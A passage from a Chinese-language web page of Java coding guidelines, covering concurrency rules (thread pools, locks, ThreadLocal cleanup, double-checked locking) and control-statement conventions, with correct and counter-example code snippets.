        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>thread<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> thread<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。</p>
<p><font color=" #977C00">说明：</font>线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源的开销，解决资源不足的问题。 如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。</p>
<p><font color=" #977C00">说明：</font>Executors 返回的线程池对象的弊端如下：</p>
<p>1）  <code>FixedThreadPool </code>和 <code>SingleThreadPool</code>：</p>
<p>允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。</p>
<p>2）  <code>CachedThreadPool</code>：</p>
<p>允许的创建线程数量为 Integer.MAX_VALUE，可能会创建大量的线程，从而导致 OOM。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>SimpleDateFormat  是线程不安全的类，一般不要定义为 static 变量，如果定义为 static， 必须加锁，或者使用 DateUtils 工具类。</p>
<p><font color="#019858">正例：</font>注意线程安全，使用 DateUtils。亦推荐如下处理：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">DateFormat</span><span class="token punctuation">&gt;</span></span> df <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">DateFormat</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token class-name">DateFormat</span> <span class="token function">initialValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #977C00">说明：</font>如果是 JDK8 的应用，==可以使用 Instant 代替 Date，LocalDateTime 代替 Calendar， DateTimeFormatter 代替 SimpleDateFormat==，官方给出的解释：simple beautiful strong immutable thread-safe。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>必须回收自定义的 ThreadLocal 变量，尤其在线程池场景下，线程经常会被复用， 如果不清理自定义的 ThreadLocal 变量，可能会影响后续业务逻辑和造成内存泄露等问题。 尽量在代理中使用 try-finally 块进行回收。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">objectThreadLocal<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token comment">// ... </span>
<span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
    objectThreadLocal<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>高并发时，同步调用应该去考量锁的性能损耗。能用无锁数据结构，就不要用锁；能 锁区块，就不要锁整个方法体；能用对象锁，就不要用类锁。</p>
<p><font color=" #977C00">说明：</font>尽可能使加锁的代码块工作量尽可能的小，避免在锁代码块中调用 RPC 方法。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>对多个资源、数据库表、对象同时加锁时，需要保持一致的加锁顺序，否则可能会造成死锁。</p>
<p><font color=" #977C00">说明：</font>线程一需要对表 A、B、C 依次全部加锁后才可以进行更新操作，那么线程二的加锁顺序也必须是 A、 B、C，否则可能出现死锁。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在使用阻塞等待获取锁的方式中，必须在 try 代码块之外，并且在加锁方法与 try 代码块之间没有任何可能抛出异常的方法调用，避免加锁成功后，在 finally 中无法解锁。</p>
<ul>
<li>
<p>说明一：如果在 lock 方法与 try 代码块之间的方法调用抛出异常，那么无法解锁，造成其它线程无法成功获取锁。</p>
</li>
<li>
<p>说明二：如果 lock 方法在 try 代码块之内，可能由于其它方法抛出异常，导致在 finally 代码块中，unlock 对未加锁的对象解锁，它会调用 AQS 的 tryRelease 方法（取决于具体实现类），抛出 IllegalMonitorStateException 异常。</p>
</li>
<li>
<p>说明三：在 Lock 对象的 lock 方法实现中可能抛出 unchecked 异常，产生的后果与说明二相同。</p>
</li>
</ul>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XxxLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">doOthers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
    lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XxxLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ... </span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token comment">//  如果此处抛出异常，则直接执行 finally 代码块</span>
    <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//  无论加锁是否成功，finally 代码块都会执行</span>
    lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">doOthers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
    lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在使用尝试机制来获取锁的方式中，进入业务代码块之前，必须先判断当前线程是否持有锁。锁的释放规则与锁的阻塞等待方式相同。</p>
<p><font color=" #977C00">说明：</font>Lock 对象的 unlock 方法在执行时，它会调用 AQS 的 tryRelease 方法（取决于具体实现类），如果当前线程不持有锁，则抛出 IllegalMonitorStateException 异常。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XxxLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">boolean</span> isLocked <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>isLocked<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">doOthers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
        lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>并发修改同一记录时，避免更新丢失，需要加锁。要么在应用层加锁，要么在缓存加锁，要么在数据库层使用乐观锁，使用 version 作为更新依据。</p>
<p><font color=" #977C00">说明：</font>如果每次访问冲突概率小于 20%，推荐使用乐观锁，否则使用悲观锁。乐观锁的重试次数不得小于 3 次。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>多线程并行处理定时任务时，Timer 运行多个 TimeTask 时，只要其中之一没有捕获抛出的异常，其它任务便会自动终止运行，使用 ScheduledExecutorService 则没有这个问题。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>资金相关的金融敏感信息，使用悲观锁策略。</p>
<p><font color=" #977C00">说明：</font>乐观锁在获得锁的同时已经完成了更新操作，校验逻辑容易出现漏洞，另外，乐观锁对冲突的解决策略有较复杂的要求，处理不当容易造成系统压力或数据异常，所以资金相关的金融敏感信息不建议使用乐观 锁更新。</p>
<p><font color="#019858">正例：</font>悲观锁遵循一锁、二判、三更新、四释放的原则。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>使用 CountDownLatch 进行异步转同步操作，每个线程退出前必须调用 countDown 方 法，线程执行代码注意 catch 异常，确保 countDown 方法被执行到，避免主线程无法执行至 await 方法，直到超时才返回结果。</p>
<p><font color=" #977C00">说明：</font>注意，子线程抛出异常堆栈，不能在主线程 try-catch 到。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>避免 Random 实例被多线程使用，虽然共享该实例是线程安全的，但会因竞争同一 seed 导致的性能下降。</p>
<p><font color=" #977C00">说明：</font>Random 实例包括 java.util.Random  的实例或者 Math.random()的方式。</p>
<p><font color="#019858">正例：</font>在 JDK7 之后，可以直接使用 API <code>ThreadLocalRandom</code>，而在  JDK7 之前，需要编码保证每个线 程持有一个单独的 Random 实例。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>通过双重检查锁（double-checked locking）（在并发场景下）存在延迟初始化的优化 问题隐患（可参考  The “Double-Checked Locking is Broken” Declaration），推荐解决方案中较 为简单一种（适用于 JDK5 及以上版本），将目标属性声明为 volatile 型，比如将 helper 的属 性声明修改为 <code>private volatile Helper helper = null;</code> 。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LazyInitDemo</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token class-name">Helper</span> helper <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">Helper</span> <span class="token function">getHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>helper <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>helper <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    helper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> helper<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// other methods and fields...</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color="#76923C">【参考】</font>volatile 解决多线程内存不可见问题。对于一写多读，是可以解决变量同步问题，但是如果多写，同样无法解决线程安全问题。</p>
<p><font color=" #977C00">说明：</font>如果是 count++操作，使用如下类实现：AtomicInteger count = new AtomicInteger(); count.addAndGet(1);</p>
<p>如果是 JDK8，推荐使用 LongAdder 对象，比 AtomicLong 性能更好（减少乐观锁的重试次数）。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>==HashMap 在容量不够进行 resize 时由于高并发可能出现死链，导致 CPU 飙升，在 开发过程中注意规避此风险==</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>ThreadLocal 对象使用 static 修饰，ThreadLocal 无法解决共享对象的更新问题。</p>
<p><font color=" #977C00">说明：</font>这个变量是针对一个线程内所有操作共享的，所以设置为静态变量，所有此类实例共享此静态变量， 也就是说在类第一次被使用时装载，只分配一块存储空间，所有此类的对象(只要是这个线程内定义的)都可以操控这个变量。</p>
</li>
</ol>
<h2 id="八-控制语句">(八)  控制语句</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>在一个 switch 块内，每个 case 要么通过 continue/break/return 等来终止，要么 注释说明程序将继续执行到哪一个 case 为止；在一个 switch 块内，都必须包含一个 default语句，并且放在最后，即使它什么代码也没有。</p>
<p><font color=" #977C00">说明：</font>注意 break 是退出 switch 语句块，而 return 是退出方法体。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>==当 switch 括号内的变量类型为 String 并且此变量为外部参数时，必须先进行 null 判断，否则会抛出 NPE 异常==。</p>
<p><font color=" #FF4500">反例：</font>如下的代码输出是什么？</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SwitchString</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">method</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token class-name">String</span> param<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//  肯定不是进入这里</span>
            <span class="token keyword">case</span> <span class="token string">"sth"</span><span class="token operator">:</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"it's sth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token comment">//  也不是进入这里</span>
            <span class="token keyword">case</span> <span class="token string">"null"</span><span class="token operator">:</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"it's null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token comment">//  也不是进入这里</span>
            <span class="token keyword">default</span><span class="token operator">:</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在 if/else/for/while/do 语句中必须使用大括号。</p>
<p><font color=" #977C00">说明：</font>即使只有一行代码，也禁止不采用大括号的编码方式：if (condition) statements;</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>三目运算符 condition?  表达式 1 :  表达式 2 中，高度注意表达式 1 和 2 在类型对齐 时，可能抛出因自动拆箱导致的 NPE 异常。</p>
<p><font color=" #977C00">说明：</font>以下两种场景会触发类型对齐的拆箱操作：</p>
<p>1）  表达式 1 或表达式 2 的值只要有一个是原始类型。</p>
<p>2）  表达式 1 或表达式 2 的值的类型不一致，会强制拆箱升级成表示范围更大的那个类型。</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> 
<span class="token class-name">Integer</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> 
<span class="token class-name">Integer</span> c <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> 
<span class="token class-name">Boolean</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> 
<span class="token comment">// a*b 的结果是 int 类型，那么 c 会强制拆箱成 int 类型，抛出 NPE 异常 </span>
<span class="token class-name">Integer</span> result<span class="token operator">=</span><span class="token punctuation">(</span>flag<span class="token operator">?</span> a<span class="token operator">*</span>b <span class="token operator">:</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在高并发场景中，避免使用”等于”判断作为中断或退出的条件。</p>
<p><font color=" #977C00">说明：</font>如果并发控制没有处理好，容易产生等值判断被“击穿”的情况，使用大于或小于的区间判断条件 来代替。</p>
<p><font color=" #FF4500">反例：</font>判断剩余奖品数量等于 0 时，终止发放奖品，但因为并发处理错误导致奖品数量瞬间变成了负数， 这样的话，活动无法终止。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>当某个方法的代码总行数超过 10 行时，return / throw  等中断逻辑的右大括号后均 需要加一个空行。</p>
<p><font color=" #977C00">说明：</font>这样做逻辑清晰，有利于代码阅读时重点关注。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>表达异常的分支时，少用 if-else 方式，这种方式可以改写成：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>condition<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> obj<span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 

<span class="token comment">//  接着写 else 的业务逻辑代码;  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #977C00">说明：</font>如果非使用 if()…else if()…else…方式表达逻辑，避免后续代码维护困难，请勿超过 3 层。</p>
<p><font color="#019858">正例：</font>超过 3 层的  if-else  的逻辑判断代码可以使用卫语句、策略模式、状态模式等来实现，其中卫语句 示例如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">findBoyfriend</span><span class="token punctuation">(</span><span class="token class-name">Man</span> man<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>man<span class="token punctuation">.</span><span class="token function">isUgly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"本姑娘是外貌协会的资深会员"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>man<span class="token punctuation">.</span><span class="token function">isPoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"贫贱夫妻百事哀"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>man<span class="token punctuation">.</span><span class="token function">isBadTemper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"银河有多远，你就给我滚多远"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"可以先交往一段时间看看"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>除常用方法（如 getXxx/isXxx）等外，不要在条件判断中执行其它复杂的语句，将复杂逻辑判断的结果赋值给一个有意义的布尔变量名，以提高可读性。</p>
<p><font color=" #977C00">说明：</font>很多  if  语句内的逻辑表达式相当复杂，与、或、取反混合运算，甚至各种方法纵深调用，理解成本非常高。如果赋值一个非常好理解的布尔变量名字，则是件令人爽心悦目的事情。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//  伪代码如下</span>
<span class="token keyword">final</span> <span class="token keyword">boolean</span> existed <span class="token operator">=</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token keyword">open</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span>existed<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"> <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">acquire</span><span class="token punctuation">(</span><span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">tryAcquire</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token function">acquireQueued</span><span class="token punctuation">(</span><span class="token function">addWaiter</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">.</span><span class="token constant">EXCLUSIVE</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">selfInterrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>不要在其它表达式（尤其是条件表达式）中，插入赋值语句。</p>
<p><font color=" #977C00">说明：</font>赋值点类似于人体的穴位，对于代码的理解至关重要，所以赋值语句需要清晰地单独成为一行。</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Lock</span> <span class="token function">getLock</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> fair<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//  算术表达式中出现赋值操作，容易忽略 count 值已经被改变</span>
    threshold <span class="token operator">=</span> <span class="token punctuation">(</span>count <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token comment">//  条件表达式中出现赋值操作，容易误认为是 sync==fair </span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>sync <span class="token operator">=</span> fair<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">FairSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">NonfairSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>循环体中的语句要考量性能，以下操作尽量移至循环体外处理，如定义对象、变量、 获取数据库连接，进行不必要的 try-catch 操作（这个 try-catch 是否可以移至循环体外）。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>避免采用取反逻辑运算符。</p>
<p><font color=" #977C00">说明：</font>取反逻辑不利于快速理解，并且取反逻辑写法一般都存在对应的正向逻辑写法。</p>
<p><font color="#019858">正例：</font>使用 if (x &lt; 628)  来表达  x  小于 628。</p>
<p><font color=" #FF4500">反例：</font>使用 if (!(x &gt;= 628))  来表达  x  小于 628。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>公开接口需要进行入参保护，尤其是批量操作的接口。</p>
<p><font color=" #FF4500">反例：</font>某业务系统，提供一个用户批量查询的接口，API 文档上有说最多查多少个，但接口实现上没做任何保护，导致调用方传了一个 1000 的用户 id 数组过来后，查询信息后，内存爆了。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>下列情形，需要进行参数校验：</p>
<p>1）  调用频次低的方法。</p>
<p>2）  执行时间开销很大的方法。此情形中，参数校验时间几乎可以忽略不计，但如果因为参数错误导致中间执行回退，或者错误，那得不偿失。</p>
<p>3）  需要极高稳定性和可用性的方法。</p>
<p>4）  对外提供的开放接口，不管是 RPC/API/HTTP 接口。</p>
<p>5）  敏感权限入口。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>下列情形，不需要进行参数校验：</p>
<p>1）  极有可能被循环调用的方法。但在方法说明里必须注明外部参数检查。</p>
<p>2）  底层调用频度比较高的方法。毕竟是像纯净水过滤的最后一道，参数错误不太可能到底层才会暴露 问题。一般 DAO 层与 Service 层都在同一个应用中，部署在同一台服务器中，所以 DAO 的参数校验，可以省略。</p>
<p>3）  被声明成 private 只会被自己代码所调用的方法，如果能够确定调用方法的代码传入参数已经做过检 查或者肯定不会有问题，此时可以不校验参数。</p>
</li>
</ol>
<h2 id="九-注释规约">(九)  注释规约</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>类、类属性、类方法的注释必须使用 Javadoc 规范，使用/**内容*/格式，不得使用 // xxx 方式。</p>
<p><font color=" #977C00">说明：</font>在 IDE编辑窗口中，Javadoc 方式会提示相关注释，生成 Javadoc 可以正确输出相应注释；在 IDE 中，工程调用方法时，不进入方法即可悬浮提示方法、参数、返回值的意义，提高阅读效率。</p>
</li>
<li>
